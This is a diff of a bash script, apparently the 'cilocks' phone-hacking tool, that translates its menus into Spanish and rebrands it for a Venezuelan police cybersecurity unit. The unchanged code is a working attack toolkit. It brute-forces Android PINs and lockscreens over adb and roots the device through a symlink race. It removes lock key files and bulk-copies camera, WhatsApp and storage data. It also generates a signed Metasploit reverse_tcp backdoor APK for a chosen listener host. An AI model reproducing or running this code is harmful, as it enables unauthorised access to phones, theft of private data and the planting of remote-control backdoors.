@@ -15,7 +15,7 @@ w="\e[1;37m"      # putih tebal     #thick white
 
 ###############################give Permissons,if not root user exit
 clear
-[[ `id -u` -eq 0 ]] > /dev/null 2>&1 || { echo -e ${m} "You must be root to run the script${n}"; echo ; exit 1; }
+[[ `id -u` -eq 0 ]] > /dev/null 2>&1 || { echo -e ${m} "TIENES QUE SER ADMINISTRADOR ${n}"; echo ; exit 1; }
 path=$(pwd)
 name='cilocks'
 version="v2.1"
@@ -26,15 +26,14 @@ function files() {
 function banner() {
 
 echo -e "${lb}
-   _______ __               __
-  / ____(_) /   ____  _____/ /_______
- / /   / / /   / __ \/ ___/ //_/ ___/
-/ /___/ / /___/ /_/ / /__/ ,< (__  )
-\____/_/_____/\____/\___/_/|_/____/$version
+ _ ___  _  _   _         _       ___      ___       _ ___    ___  _        _   _   _  
+/   |  /  |_) /    |\/| / \ \  /  |  |     |  |\ | |_  |  |   |  |_)  /\  | \ / \ |_) 
+\_ _|_ \_ |   \_   |  | \_/  \/  _|_ |_   _|_ | \| |  _|_ |_  |  | \ /--\ |_/ \_/ | \   
+                                                          \/_/                                              
 ${n}"
-echo -e "${m}   Crack Interface LockScreen${n}"
-echo -e "${m}       Android/IOS Hacking${n}"
-echo -e "${lb}      LoliC0d3 - Tegal1337${n}"
+echo -e "${m}   UNIDAD DE CIBERSEGURIDAD ${n}"
+echo -e "${m}         CICPC VENZUELA${n}"
+
 }
 
 # function menu() {
@@ -51,7 +50,7 @@ source data/os
 sleep 1
 function os() {
   banner
-echo -e "${m}        Detect Your OS ${n}"
+echo -e "${m}        Detectando Sistema Operativo${n}"
 }
 os
 sleep 0.5
@@ -61,7 +60,7 @@ echo $(lsb_release -i)
 sleep 0.5
 echo $(lsb_release -c)
 sleep 0.5
-echo "Your IP Address: "$lanip
+echo "Tu direccion de IP : "$lanip
 sleep 3
 # echo "Your IP Address (Ipv6): "$lanip6
 # sleep 0.5
@@ -70,7 +69,7 @@ sleep 3
 clear
 function config() {
   banner
-echo -e "${m}    Detect Installed Package ${n}"
+echo -e "${m}    Detectando Paquetes Instalados ${n}"
 }
 config
 source data/config
@@ -79,22 +78,22 @@ clear
   clear
   banner
   echo -e "${lh}
-  1.Update
-  2.Brute Pin 4 Digit
-  3.Brute Pin 6 Digit
-  4.Brute LockScreen Using Wordlist
-  5.Bypass LockScreen {Antiguard} Not Support All OS Version
-  6.Root Android {Supersu} Not Support All OS Version
-  7.Jump To Adb Toolkit
-  8.Reset Data
-  9.Remove LockScreen {Root}
-  10.Jump To Metasploit
+  1.Actualización
+  2.Crackear Pin 4 dígitos
+  3.Cracker Pin  6 dígitos
+  4.Brute LockScreen usando Wordlist
+  5.Bypass LockScreen {Antiguard} no es compatible con todas las versiones del sistema operativo
+  6.Root Android {Supersu} no es compatible con todas las versiones del sistema operativo
+  7.Ir al kit de herramientas de Adb
+  8.Restablecer datos
+  9.Eliminar LockScreen {root}
+  10.Saltar a Metasploit
   11.Control Android {Scrcpy}
-  12.Phone Info
-  13.IP Logger {Over Internet}
-  14.Get WebCam {Over Internet}
-  15.FireStore Vulnerability
-  99.Exit
+  12.Información del teléfono
+  13.IP Logger {A través de Internet}
+  14.Obtenga WebCam {A través de Internet}
+  15.Vulnerabilidad de FireStore
+  99.Salir
   ${n}"
   read -p "senpai@tegalsec:~# " select
 if [[ $select == 1 ]]; then
@@ -119,7 +118,7 @@ elif [[ $select == 2 ]]; then
   adb shell input keyevent 26 #Pressing the lock button
   adb shell input keyevent 82
 
-  echo "Brute Pin 4 Digit"
+  echo "Crackear Pin de 4 Digitos"
   for i in {0000..9999}; do
       echo "Try =>" $i
 
@@ -142,7 +141,7 @@ elif [[ $select == 3 ]]; then
   adb shell input keyevent 26 #Pressing the lock button
   adb shell input keyevent 82
 
-  echo "Brute Pin 6 Digit"
+  echo "Crackear Pin de 6 Digitos"
   for i in {000000..999999}; do
       echo "Try =>" $i
 
@@ -171,7 +170,7 @@ elif [[ $select == 3 ]]; then
 elif [[ $select == 4 ]]; then
   adb shell input keyevent 26 #Pressing the lock button
   adb shell input keyevent 82
-  echo "Brute LockScreen Using Wordlist"
+  echo "Crackear LockScreen Usando Listado de Palabras"
   read -p "list -> " files
   for i in `cat $files`; do
       echo "Try =>" $i
@@ -217,8 +216,8 @@ elif [[ $select == 6 ]]; then
   command "while ! ln -s /data/local.prop /data/data/com.android.settings/a/file99 2>/dev/null; do :; done; echo 'Overwrote local.prop!';"
 
 if command "cat /data/local.prop"
-	then echo "Succesfully rooted!"
-	echo "Requires a reboot..."
+	then echo "Tenemos Acceso Root!"
+	echo "Requiere rebootear..."
 	adb reboot
 	sleep 2
 	adb wait-for-device
@@ -239,22 +238,22 @@ elif [[ $select == 7 ]]; then
   }
   mmeta
   echo -e "${lh}
-1.Shell
-2.ScreenShot
-3.Copy All Camera Photo
-4.Copy All WhatsApp Folder
-5.Copy All Data Storage
+. Cáscara
+2.Captura de pantalla
+3.Copiar todas las fotos de la cámara
+4.Copiar toda la carpeta de WhatsApp
+5.Copie todo el almacenamiento de datos
 6.Manual Copy {Costum}
-7.Backup Data
-8.Restore Data
-9.Permissons Reset
-10.Reboot
-99.Menu
+7.Copia de seguridad de datos
+8.Restaurar datos
+9. Restablecimiento de Permissons
+10.Reiniciar
+99.Menú
 ${n}  "
 fpath="backup"
-read -p "senpai@tegalsec:~# " select
+read -p "CICPC:> " select
   if [[ $select == 1 ]]; then
-      echo "Opening Shell..."
+      echo "Abriendo Shell..."
       sleep 3
       adb shell
     elif [[ $select == 2 ]]; then
@@ -264,28 +263,28 @@ read -p "senpai@tegalsec:~# " select
       paths=$path/$file
       adb exec-out screencap -p > $file
       sudo mv $file $paths
-      echo "Your File Saved In $paths "
+      echo "Fichero guardado en $paths "
     elif [[ $select == 3 ]]; then
       export time=$(date +"%T")
       path=Files
       dir=DCIM-$time
       paths=$path/$dir
       adb pull /sdcard/DCIM/ $path/$dir
-      echo "Your File Saved In $paths "
+      echo "Fichero guardado en  $paths "
     elif [[ $select == 4 ]]; then
       export time=$(date +"%T")
       path=Files
       dir=WhatsApp-$time
       paths=$path/$dir
       adb pull /sdcard/WhatsApp/ $paths
-      echo "Your File Saved In $paths "
+      echo "Fichero Guardado en  $paths "
     elif [[ $select == 5 ]]; then
       export time=$(date +"%T")
       path=Files
       dir=sdcard-$time
       paths=$path/$dir
       adb pull /sdcard/ $paths
-      echo "Your File Saved In $paths "
+      echo "Fichero Guardado en  $paths "
     elif [[ $select == 6 ]]; then
       echo "Ex: /sdcard/Document/"
       read -p "Enter Path: " pathz
@@ -293,7 +292,7 @@ read -p "senpai@tegalsec:~# " select
       path=Files
       paths=$path/$dir
       adb pull $pathz $paths
-      echo "Your File Saved In $paths "
+      echo "Fichero Guardado en $paths "
     elif [[ $select == 7 ]]; then
       adb backup -apk -shared -all -f $fpath/backup.ab
     elif [[ $select == 8 ]]; then
@@ -310,12 +309,12 @@ elif [[ $select == 8 ]]; then
   1.Fastboot
   2.Recovery
   ${n}"
-  read -p "senpai@tegalsec:~# " select
+  read -p "CICPC:> " select
   if [[ $select == 1 ]]; then
     adb reboot bootloader
     deviceConnected=konek
     	if [ "$(konek)" = 'NO' ]; then
-    		echo "Waiting Phone..."
+    		echo "Esperando Telefono..."
     		$adb wait-for-device
       fi
         fastboot devices
@@ -324,19 +323,19 @@ elif [[ $select == 8 ]]; then
    elif [[ $slect == 2 ]]; then
      deviceConnected=konek
      	if [ "$(konek)" = 'NO' ]; then
-     		echo "Waiting Phone..."
+     		echo "Esperando Telefono.."
      		$adb wait-for-device
        fi
        adb devices
        adb shell recovery --wipe_data
   else
-    echo -e  "${m} Your Brain Error!${n}"
+    echo -e  "${m} Error de Mente!${n}"
   fi
 
 elif [[ $select == 9 ]]; then
   rem=$(adb shell su -c rm /data/system/*.key | adb reboot )
   echo $rem
-  echo "success"
+  echo "Listo"
 
 
 
@@ -344,15 +343,15 @@ elif [[ $select == 10 ]]; then
   clear
   function mmeta() {
     banner
-    echo -e "${m}   Metasploit Backdoor Generator${n}"
+    echo -e "${m}   Generador de Puerta trasera usando Metasploit${n}"
   }
   mmeta
 echo -e "${lh}
-1.Install Application
-2.Create Payload Backdoor {Msfvenom} Singed
-3.Run Metasploit
-4.Inject Payload In Original Application
-99.Menu
+1.Instalar aplicación
+2.Crear puerta trasera de carga útil {msfvenom} chamuscado
+3.Ejecutar Metasploit
+4.Inyecte carga útil en la aplicación original
+99.Menú
 ${n}"
 read -p "senpai@tegalsec:~# " select
 if [[ $select == 1 ]]; then
@@ -369,11 +368,11 @@ if [[ $select == 1 ]]; then
 elif [[ $select == 2 ]]; then
   path="backdoor"
   loli="loli.apk"
-  read -p "Enter LHOST: " host
-  read -p "Enter LPORT: " port
-  read -p "Application Name: " app
+  read -p "Ingresar LHOST: " host
+  read -p "Ingresar LPORT: " port
+  read -p "Nombre de Aplicacion: " app
   paths=$path/$loli
-  echo -e "${lb}Wait Creating Backdoor...${n}"
+  echo -e "${lb}Creando Puerta Trasera...${n}"
   msfvenom -p android/meterpreter/reverse_tcp lhost=$host lport=$port R> $paths
   echo "Wait Installing Keystore..."
   sleep 5
@@ -384,7 +383,7 @@ elif [[ $select == 2 ]]; then
   milf=$path/$app'.apk'
   rm $paths
   rm $path/key.keystore
-  echo "Your Backdoor Created In" $milf
+  echo "Fichero creado en " $milf
 elif [[ $select == 3 ]]; then
   clear
   mmeta
